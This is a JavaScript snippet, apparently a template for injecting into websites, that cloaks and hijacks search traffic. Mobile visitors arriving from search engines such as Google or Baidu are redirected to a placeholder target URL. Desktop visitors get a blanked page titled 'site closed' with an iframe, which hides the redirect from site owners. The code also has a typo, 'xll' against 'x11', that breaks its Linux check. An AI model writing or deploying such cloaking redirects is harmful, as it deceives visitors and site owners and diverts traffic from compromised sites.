if (window.name != 'ad_app6') {
    var r = document.referrer.toLowerCase();
    var aSites = new Array('google.', 'baidu.', 'sm.', 'soso.', 'so.', '360.', 'yahoo.', 'youdao.', 'sogou.', 'gougou.');

    var ccc = navigator["userAgent"]["toLowerCase"]()["match"](/(ipod|iphone|ipad|android|coolpad|mmp|smartphone|midp|wap|xoom|symbian|j2me|blackberry|wince)/i);
    var b = false;
    for (i in aSites) {
        if (r.indexOf(aSites[i]) > 0 && ccc != null) {
            b = true;
            break;
        }
    }
    if (b) {
        self.location = '要跳转的URL';
        window.adworkergo = 'ad_app6';
        // window.name = 'ad_app6';
    } else {
        var system = {
            win: false,
            mac: false,
            xll: false
        };
        var p = navigator.platform;
        var us = navigator.userAgent.toLowerCase();
        system.win = p.indexOf("Win") == 0;
        system.mac = p.indexOf("Mac") == 0;
        system.x11 = (p == "X11") || (p.indexOf("Linux") == 0);
        if (system.win || system.mac || system.xll) {
            var iframe_url = '/none.html';
            $("head").html('<meta charset="UTF-8"><meta name="referrer" content="no-referrer"><title>网站关闭</title><style>body{position:static !important;}body *{ visibility:hidden; }</style> ');
            $("body").empty();
            $(document).ready(function () {
                $("body").html('<iframe style="width:100%; height:100%;position:absolute;margin-left:0px;margin-top:0px;top:0%;left:0%;" id="mainFrame" src="' + iframe_url + '" frameborder="0" scrolling="yes"></iframe>').show();
                $("body *").css("visibility", "visible");
            });
        }
    }
}
